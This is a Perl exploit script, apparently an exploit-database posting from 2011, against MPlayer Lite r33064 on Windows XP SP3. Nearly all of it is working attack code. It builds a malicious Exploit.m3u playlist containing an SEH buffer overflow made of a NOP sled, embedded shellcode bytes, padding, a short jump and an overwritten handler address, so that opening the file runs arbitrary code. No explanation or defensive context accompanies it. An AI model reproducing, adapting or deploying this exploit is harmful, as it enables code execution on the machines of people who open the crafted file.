#!/usr/bin/perl
#
#[+]Exploit Title: Exploit Buffer Overflow Msplayer(SEH)
#[+]Date: 19\03\2011
#[+]Author: C4SS!0 and h1ch4m
#[+]Software Link: http://sourceforge.net/projects/mplayer-ww/files/MPlayer_Release/Revision%2033064/mplayer_lite_r33064.7z/download
#[+]Version: Lite 33064
#[+]Tested On: WIN-XP SP3 
#[+]CVE: N/A
#
#Created BY C4SS!0 And h1ch4m
#C4SS!0: E-mail Louredo_@hotmail.com
#h1ch4m: E-mail h1ch4m@live.fr
#
#
use strict;
use warnings;
use IO::File;

print q
{

                Created BY C4SS!0 And h1ch4m
		Site www.exploit-br.org
		E-mail Louredo_@hotmail.com
			
};
sleep(2);
print "\t\t[+]Creating File Exploit.m3u\n\n";
sleep(1);
my $shellcode = 
"\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" .
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" .
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa" .
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96" .
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b" .
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a" .
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83" .
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98" .
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" .
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" .
"\x7f\xe8\x7b\xca";

my $buf = "\x90" x 100;
$buf .= $shellcode;
$buf .= "\x41" x (5152-length($buf));;
$buf .= "\xeb\x0f\xcc\xcc";
$buf .= pack('V',0x6B04FCDE);
$buf .= "\x90" x 15;
$buf .= "\xE9\xD4\xEB\xFF\xFF";
$buf .= "\x90" x 400;


open(my $FILE,">Exploit.m3u") || die "**[x]Error:\n$!\n";
print $FILE "http:// ".$buf;
close($FILE);
print "\t\t[+]File Created With Sucess\n\n";
sleep(3);